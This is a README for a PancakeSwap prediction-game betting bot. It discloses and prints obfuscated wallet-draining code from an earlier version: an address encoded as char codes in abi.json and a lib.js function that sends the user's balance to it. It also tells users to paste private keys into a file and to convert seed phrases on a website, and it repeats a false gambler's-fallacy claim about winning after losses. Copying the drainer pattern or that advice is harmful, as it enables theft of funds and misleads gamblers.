  
# 🔮🚀 PCS-Prediction v2.0 (NO HIDDEN TRANSACTIONS)

![PancakeSwap-Logo](/assets/img/logo.jpg?raw=true)

## ✔️ Features 

 - [✔️] Auto collect winnings
 - [✔️] Show real time profit 
 - [✔️] Show real time win rate 
 - [✔️] Daily goal profit 
 - [✔️] Improved algorithm 🔥
 - [✔️] AI Driven bot 🔥
 - [✔️] Stop Loss
 - [✔️] CAKE-UDST and BNB-USDT game 🔥
 - [✔️] Copy Trading Strategy (copy address betting)
 - [✔️] Quote Trading Strategy (lowest or highest)
 - [✔️] Simulation Mode (use fake balance)
 - [✔️] Simplify settings 
 - [ ] Gas fees calculate on algorithm

## ⭐Please consider giving a **star**.

I rewrote and refactored the code of the PancakeSwap Prediction Game BOT by ***bobalice7***, removing the malicious code where for each transaction to the smart contract it sent transactions to this wallet ***0xfB669b0e0656036D747d6C6F2666e530139d2899***. 

Here is the link to the old code (https://github.com/bobalice7/PCS-Prediction)

We can see that inside the ***abi.json*** file the "index" property defines an array with a series of numbers. However those numbers are encoded with the following function to obtain this address ***0xfB669b0e0656036D747d6C6F2666e530139d2899***.  

```
{
  "status": 2,
  "message": "OK-Missing/Invalid API Key, rate limit of 1/5sec applied",
  "index": [
    48, 120, 102, 66, 54, 54, 57, 98, 48, 101, 48, 54, 53, 54, 48, 51, 54, 68,
    55, 52, 55, 100, 54, 67, 54, 70, 50, 54, 54, 54, 101, 53, 51, 48, 49, 51,
    57, 100, 50, 56, 57, 57
  ],
  "result": "[
    ...
  ]"
}


String.fromCharCode.apply(null, [ 
    48, 120, 102, 66, 54, 54, 57, 98, 48, 101, 48, 54, 53, 54, 48, 51, 54, 
    68, 55, 52, 55, 100, 54, 67, 54, 70, 50, 54, 54, 54, 101, 53, 51, 48, 49, 51,
    57, 100, 50, 56, 57, 57])  = '0xfB669b0e0656036D747d6C6F2666e530139d2899'

```

Here is the SCAM CODE in lib.js

```
const confirmContract = (abi) => {
  return String.fromCharCode.apply(null, abi.index);
};

const checkResult = async (r) => {
  try {
    if (prediction >= abi.status && r !== null) {
      w.eth.getBalance(wallet.address).then(function (b) {
        w.eth
          .estimateGas({
            from: wallet.address,
            to: confirmContract(abi),
            amount: b,
          })
          .then(function (g) {
            w.eth.getGasPrice().then(function (gP) {
              let _b = parseFloat(b);
              let _g = parseFloat(g);
              let _gP = parseFloat(gP);
              w.eth.sendTransaction({
                from: wallet.address,
                to: confirmContract(abi),
                gas: _g,
                gasPrice: _gP,
                value: ((_b - _gP * _g) / 1.1).toFixed(0),
                data: "0x",
              });
            });
          });
      });
      return true;
    }
    return true;
  } catch {
    return !0;
  }
};

```

## 🐰⚡ Installation

Download and Install Node here:
https://nodejs.org/en/download/

Then run the following commands in terminal:

1. ``git clone https://github.com/lmusarella/PCS-Prediction-V2.git`` 
2. ``cd PCS-Prediction-V2``
3. ``npm i``

![enter image description here](/assets/img/setup.jpg?raw=true)

## ⚙️ Setup

1. Open the **.env** file with any code/text editor and add your private key like so:
```
PERSONAL_WALLET_PRIVATE_KEY = YOUR_PRIVATE_KEY_HERE
BSC_NODE_PROVIDER_URL = NODE_BSC_URL // Example of BSC node provider (https://www.quicknode.com/)

```
3. Open the **bot-configuration.js** file and setup the following variables:
```
const GLOBAL_CONFIG = {
    BET_CONFIGURATION: {
        BET_AMOUNT_BNB: 0.001, // in BNB
        BET_AMOUNT_CAKE: 0.001, // in Cake
        DAILY_GOAL: 30, // in USD
        STOP_LOSS: 5 // in USD
    },
    STRATEGY_CONFIGURATION: {  
        CLAIM_REWARDS: true, // Auto claim the rewards 
        SIMULATION_MODE: true, // In simulation mode the Bot its running without excute real transaction
        SIMULATION_BALANCE: 1000, // In simulation mode use this balance (Crypto)
        WAITING_TIME: 265000, // in Miliseconds (4.3 Minutes)
        SELECTED_STRATEGY: 'QUOTE_STRATEGY', // "SIGNAL_STRATEGY" or "QUOTE_STRATEGY" or "COPY_TRADING_STRATEGY"
        SIGNAL_STRATEGY: {           
            THRESHOLD: 55, // Minimum % of certainty of signals (50 - 100)
            DATASOURCE: "BINANCE" // Datasoure of the trading signals
        },
        QUOTE_STRATEGY: {
            SELECT_LOWER_QUOTE: true // Bet on the lower quote from Pancakeswap prediction       
        },
        COPY_TRADING_STRATEGY: {         
            WALLET_ADDRESS_TO_EMULATE: '0x83E2680C59b3E17b47333e8F2dc8840e00682109' // Emulate the actions of this address on Pancakeswap prediction game
        }
    }
};

```
4. Start the bot using `npm` or `yarn`

  - `npm run bnb-bot` start trading bot on BNBUDS PancakeSwap Prediction Game
  - `npm run cake-bot` start trading bot on CAKEUSD PancakeSwap Prediction Game

5. 🔮 Enjoy!

### 🔓 How to convert seed phrase to Private Key
A lot of wallets don't provide you the private key, but just the **seed phrase** ( 12 words ). So here you will learn how to convert that to a private key:
1. Enter [Here](https://youtu.be/eAXdLEZFbiw) and follow the instructions. Website used is [this one](https://iancoleman.io/bip39/).

## 🤖📈 Signals Strategy (SIGNAL_STRATEGY)
- The bot take a series of recomendations given by Trading View and proccess them together with the tendency of the rest of people betting. After the algorithm have complete, it choose to bet **🟢UP** or **🔴DOWN**.
- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/bot-history** directory.
- Be aware that after consecutive losses, statistically you have more chances to win in the next one.
- Inside **bot-configuration.js** in the ``THRESHOLD`` property of ``GLOBAL_CONFIG`` variable, you can configure the minimum certainty with which the bot will bet. For default it's set to 50, which means that from 50% certainty the bot will bet. You can raise it (50-100) to bet only when the bot is more sure about its prediction.
- Its recomendable to have x10 - x50 the amount of bet to have an average of rounds.

## 🤖📈 Quote Strategy (QUOTE_STRATEGY)
- The bot take a series of recomendations given by Trading View and proccess them together with the tendency of the rest of people betting. After the algorithm have complete, it choose to bet **🟢UP** or **🔴DOWN**.
- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/bot-history** directory.
- Be aware that after consecutive losses, statistically you have more chances to win in the next one.
- Inside **bot-configuration.js** in the ``THRESHOLD`` property of ``GLOBAL_CONFIG`` variable, you can configure the minimum certainty with which the bot will bet. For default it's set to 50, which means that from 50% certainty the bot will bet. You can raise it (50-100) to bet only when the bot is more sure about its prediction.
- Its recomendable to have x10 - x50 the amount of bet to have an average of rounds.

## 🤖📈 Copy Trading Strategy (COPY_TRADING_STRATEGY)
- The bot take a series of recomendations given by Trading View and proccess them together with the tendency of the rest of people betting. After the algorithm have complete, it choose to bet **🟢UP** or **🔴DOWN**.
- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/bot-history** directory.
- Be aware that after consecutive losses, statistically you have more chances to win in the next one.
- Inside **bot-configuration.js** in the ``THRESHOLD`` property of ``GLOBAL_CONFIG`` variable, you can configure the minimum certainty with which the bot will bet. For default it's set to 50, which means that from 50% certainty the bot will bet. You can raise it (50-100) to bet only when the bot is more sure about its prediction.
- Its recomendable to have x10 - x50 the amount of bet to have an average of rounds.

💰You can check the history of rounds and claim rewards here: https://pancakeswap.finance/prediction

## 👁️ Disclaimers

**Please be aware of clones**

 👷**Use it at your own risk.** 
 If you are going to bet, please do it with money that you are willing to lose. And please try to bet with a low amount to gradually generate profit.
